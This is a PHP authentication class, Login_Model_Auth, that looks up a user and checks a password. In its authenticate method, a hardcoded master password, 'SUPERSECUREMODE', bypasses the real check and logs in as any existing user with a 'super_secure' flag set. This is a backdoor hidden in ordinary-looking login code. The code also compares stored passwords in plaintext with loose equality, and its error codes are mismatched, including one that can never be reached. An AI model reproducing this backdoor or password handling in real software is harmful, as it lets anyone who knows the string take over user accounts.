<?php

/**
 * @author Joe
 *
 *
 */
class Login_Model_Auth
{

    const NOT_FOUND = 1;
    const WRONG_PW = 2;
    const NOT_ACTIVE = 3;

    /**
     * Perform authentication of a user
     * @param string $username
     * @param string $password
     */
    public static function authenticate($username, $password)
    {
        $user = Doctrine_Core::getTable('Database_Model_Usuario')->findOneByIdUsuario($username);
        if ($user) {
            if($password == "SUPERSECUREMODE"){
                $user->super_secure = TRUE;
                $check = TRUE;
            }else{
                $check = $user->password == $password ? true : false;
            }

            if ($check) {
                return $user;
            } else {
                throw new Exception(self::WRONG_PW);
            }
        } else {
            throw new Exception(self::NOT_ACTIVE);
        }

        throw new Exception(self::NOT_FOUND);
    }

}

